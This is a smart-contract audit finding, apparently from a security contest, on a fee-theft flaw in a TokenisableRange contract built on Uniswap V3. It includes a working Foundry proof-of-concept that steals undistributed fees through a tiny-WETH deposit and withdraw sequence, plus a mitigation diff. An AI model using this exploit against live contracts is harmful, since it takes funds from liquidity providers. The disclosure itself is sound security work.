            "detail": "\n# Vulnerability details\n\nThe `TokenisableRange` is designed to always collect trading fees from the Uniswap V3 pool, whenever there is a liquidity event (`deposit` or `withdraw`). These fees may be reinvested in the pool, or may be held in form of `fee0` and `fee1` ERC-20 balance held by the TokenisableRange contract.\n\nWhen a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).\n\nTo prevent users from stealing fees, there are several mechanisms in place:\n1. fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these fees\n2. whenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees \"is not given away for free\"\n\nBoth of these mechanisms can however be worked around:\n1. the 1% check is done on the `fee0` and `fee1` **amounts** compared to the theoretical pool amounts, and **not on the total value of the fees** as compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions.\n2. the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei's of tokens to short-circuit the downscaling, and have a share of fees \"for free\".\n\n## Impact\nGiven a TokenisableRange contract in the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft a `deposit` and `withdraw` sequence (why not, with flash-loaned assets) to steal most of the fees (`fee0`, `fee1`) held by the pool before distribution.\n\n## Proof of Concept\nBelow is a working PoC that shows under real market conditions how most of the fees (>3% of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity:\n```Solidity\n    function testStolenFeesPoc() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n\n        vm.prank(tokenWhale);\n        USDC.transfer(alice, 100_000e6);\n\n        vm.startPrank(alice);\n        TokenisableRange tr = new TokenisableRange();\n\n        // out of range: WETH is more valuable than that (about 1870 USDC on this block 17811921); \n        // the pool will hold 0 WETH\n        tr.initProxy(AaveOracle, USDC, WETH, 500e10, 1000e10, \"Test1\", \"T1\", false);\n\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n\n        // time passes, and the pool trades in range, accumulating fees\n        uint256 fee0 = 1_000e6;\n        uint256 fee1 = 2e18;\n\n        vm.mockCall(address(UniswapV3UsdcNFPositionManager), \n            abi.encodeWithSelector(INonfungiblePositionManager.collect.selector), \n            abi.encode(fee0, fee1));\n\n        vm.stopPrank();\n        vm.startPrank(tokenWhale);\n        USDC.transfer(address(tr), fee0);\n        WETH.transfer(address(tr), fee1);\n\n        // now the price is back to 1870 USDC,\n        // the undistributed fees are 1k USDC and 2 WETH, \n        // in total about $5k or 5% of the pool value \n        // (the percentage can be higher with bigger price swings)\n        // but still, they are not reinvested\n        tr.claimFee();\n        vm.clearMockedCalls();\n        require(tr.fee0() != 0);\n        require(tr.fee1() != 0);\n\n        // an attacker now can flashloan & deposit an amount that will give them\n        // the majority of the pool liquidity, then withdraw for a profit\n        uint256 usdcBalanceBefore = USDC.balanceOf(tokenWhale);\n        uint256 wethBalanceBefore = WETH.balanceOf(tokenWhale);\n        uint256 poolSharesBefore = tr.balanceOf(tokenWhale);\n\n        USDC.approve(address(tr), 10_000_000e6);\n        // this is the hack: we add just a tiny little bit of WETH so TokenisableRange doesn't\n        // count the value locked in fees in assigning the LP tokens\n        WETH.approve(address(tr), 1000);\n        uint256 deposited = tr.deposit(10_000_000e6, 1000);\n        tr.withdraw(deposited, 0, 0);\n\n        // the profit here is\n        // 1 wei of USDC lost, probably to rounding\n        console2.log(int(USDC.balanceOf(tokenWhale)) - int(usdcBalanceBefore)); \n        // 1.58 WETH of profit, which is most of the fees, \n        // and definitely more than 1% of the pool. Yay! \n        console2.log(int(WETH.balanceOf(tokenWhale)) - int(wethBalanceBefore));\n        require(poolSharesBefore ==  tr.balanceOf(tokenWhale));\n    }\n```\nIt is important to note that since the WETH oracle price at the forked block (17811921) is at 1870, above the 500-1000 range, the above PoC works only after fixing my other finding titled:\n> Incorrect Solidity version in FullMath.sol can cause permanent freezing of assets for arithmetic underflow-induced revert\n\n## Tools Used\nCode review\n\n## Recommended Mitigation Steps\n- factor in also the token prices when calculating whether the accrued fees are indeed 1% of the pool\n- when minting TokenisableRange tokens, **always** downscale the minted fees by the relative value of non-distributed fees in the pool:\n```diff\n    // Stack too deep, so localising some variables for feeLiquidity calculations \n-    // If we already clawed back fees earlier, do nothing, else we need to adjust returned liquidity\n-    if ( newFee0 == 0 && newFee1 == 0 ){\n+    {\n      uint256 TOKEN0_PRICE = ORACLE.getAssetPrice(address(TOKEN0.token));\n      uint256 TOKEN1_PRICE = ORACLE.getAssetPrice(address(TOKEN1.token));\n      require (TOKEN0_PRICE > 0 && TOKEN1_PRICE > 0, \"Invalid Oracle Price\");\n      // Calculate the equivalent liquidity amount of the non-yet compounded fees\n      // Assume linearity for liquidity in same tick range; calculate feeLiquidity equivalent and consider it part of base liquidity \n      feeLiquidity = newLiquidity * ( (fee0 * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (fee1 * TOKEN1_PRICE / 10 ** TOKEN1.decimals) )   \n                                    / ( (added0   * TOKEN0_PRICE / 10 ** TOKEN0.decimals) + (added1   * TOKEN1_PRICE / 10 ** TOKEN1.decimals) ); \n    }\n```\n\n\n\n\n\n\n\n\n\n\n\n## Assessed type\n\nMath"
